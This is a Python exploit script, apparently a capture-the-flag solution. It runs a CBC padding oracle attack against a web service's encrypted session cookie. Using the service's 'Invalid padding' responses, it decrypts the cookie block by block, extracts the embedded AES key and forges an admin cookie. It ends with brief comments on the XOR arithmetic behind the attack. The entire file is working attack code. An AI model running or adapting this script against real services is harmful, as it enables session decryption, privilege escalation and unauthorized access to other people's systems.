import base64
import json
import secrets
import sys
from copy import deepcopy

import requests

from sploit_lib import *


def get_blocks(s):
    return [s[i:i + 16] for i in range(len(s))[::16]]


def get_data(blocks):
    return b''.join(blocks)


def unpad(s):
    return s[:-s[-1]]


HOST = sys.argv[1]
PORT = 33054

if len(sys.argv) > 2:
    PORT = sys.argv[2]

username = secrets.token_hex(10)
password = secrets.token_hex(10)

sess = requests.Session()
sess.post(f'http://{HOST}:{PORT}/register', data={'username': username, 'password': password})
sess.post(f'http://{HOST}:{PORT}/login', data={'username': username, 'password': password})

cookie = sess.cookies['cookie']

print(f'Got encrypted data: {cookie}')

cookie = base64.b64decode(cookie)
cookie_blocks = get_blocks(cookie)

cnt_blocks = len(cookie_blocks) - 1
cur_ans = b''
result = b''

for block in range(cnt_blocks):
    print(f'Attacking block {block + 1} of {cnt_blocks}...')
    for l in range(1, 17):
        for i in range(256):
            new_blocks = deepcopy(cookie_blocks)
            new_blocks[-2] = new_blocks[-2][:-l] + bytes([i]) + bytes(
                [
                    cookie_blocks[-2][16 - l + cur_c + 1] ^ cur_ans[cur_c] ^ l for cur_c in range(len(cur_ans))
                ]
            )

            if len(new_blocks[-2]) != 16:
                continue

            data = get_data(new_blocks)

            test_cookies = {
                'cookie': base64.b64encode(data).decode(),
            }
            r = requests.get(f'http://{HOST}:{PORT}/admin', cookies=test_cookies)
            # print(f'Debug resp: {r.text}')

            if r.text != 'Invalid padding' and (i != cookie_blocks[-2][-l] or (cookie_blocks[-2][-l] ^ l ^ i) == l):
                cur_ans = bytes([cookie_blocks[-2][-l] ^ l ^ i]) + cur_ans

                # print(f'Got response: {r.text}')
                print(f'Current block value: {cur_ans}, length: {len(cur_ans)}')

                break
    if len(cur_ans) == 16:
        print(f'Finished! Block is {cur_ans}')
    else:
        print(f'Unable to get block {block + 1}')
        print('Stopping the attack...')
        exit(1)

    result = cur_ans + result
    cur_ans = b''
    cookie_blocks = deepcopy(cookie_blocks[:-1])

print(f'Get decrypted cookies: {result}')
result = unpad(result)

json_data = json.loads(result.decode())
key = json_data['key']

json_payload = {
    'username': 'admin',
    # 'key': key,
}

encrypted_cookie = AESCipher(key).encrypt(json.dumps(json_payload))

payload = encrypted_cookie.decode()

r = requests.get(f'http://{HOST}:{PORT}/admin', cookies={'cookie': payload})
print(r.text)

# log.success('Got a flag: {}'.format(real_flag))

# real ^ decoded = plaintext
# real ^ decoded ^ plaintext = 0
# real ^ decoded ^ plaintext ^ l = l


# real ^ decoded = plaintext
# guess ^ decoded = l => decoded = l ^ guess
# plaintext = real ^ decoded = real ^ l ^ guess
